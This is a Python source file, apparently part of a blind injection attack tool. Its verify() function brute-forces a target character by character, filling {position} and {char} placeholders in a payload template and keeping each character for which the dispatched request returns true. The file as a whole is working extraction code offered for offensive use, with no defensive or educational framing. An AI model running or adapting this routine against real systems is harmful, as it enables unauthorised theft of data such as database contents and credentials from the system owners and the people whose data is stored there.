import config
import request
import sys

collected = ""
characters = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ.#$%^&*()_+?/><,.!@~`^*[]{}/"
config.count_limit = 0
def verify(payload):
    try:
        global collected
        payloads = payload.replace("{limit_count}", str(config.count_limit))
        positions = 1
        while True:
            restart = False
            for chars in characters:
                fin_payload = payloads.replace("{position}", str(positions))
                final_payload = fin_payload.replace("{char}", str(chars))
                result = request.dispatch_request(payload=final_payload)
                if result == True:
                    collected += chars
                    positions += 1
                    restart = True
                    break
            if not restart:
                results = collected
                config.count_limit += 1
                collected = ""
                return results
    except KeyboardInterrupt:
        print("[WARN] Extraction was interrupted Ctrl-C")
        sys.exit(1)
    
        
                
            